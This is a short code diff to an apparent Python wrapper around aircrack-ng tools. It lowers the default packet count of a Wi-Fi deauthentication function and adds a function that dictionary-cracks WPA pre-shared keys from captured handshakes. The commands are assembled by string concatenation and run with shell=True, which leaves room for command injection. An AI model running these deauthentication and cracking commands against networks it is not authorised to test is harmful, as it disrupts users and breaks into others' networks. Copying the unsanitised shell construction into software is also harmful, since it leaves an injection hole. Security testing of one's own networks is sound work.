@@ -35,7 +35,7 @@ def sniffssid(device, ssid, channel, dumpfilename='output'):
     return 0
 
 
-def deauth(device, accesspoint_mac, client_mac, packets=10):
+def deauth(device, accesspoint_mac, client_mac, packets=2):
     """send deauthentication packets to client and access point with device"""
     
     command = 'aireplay-ng -0 ' + str(packets) + ' -a ' + accesspoint_mac + ' -c ' + client_mac + ' ' + device
@@ -76,7 +76,16 @@ def enabledevice(device):
     command = 'ifconfig ' + device + ' up'
     subprocess.Popen(command, shell=True)
     
-    return 0 
+    return 0
+
+
+def crackpsk(mac, capturefilename, wordlist='wordlist.txt'):
+    
+    command = 'aircrack-ng -w ' + wordlist + ' -b ' + mac + ' ' + capturefilename + '*.cap'
+    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+    out, err = p.communicate()
+    
+    return out
 
 
 def airmoncheckkill():
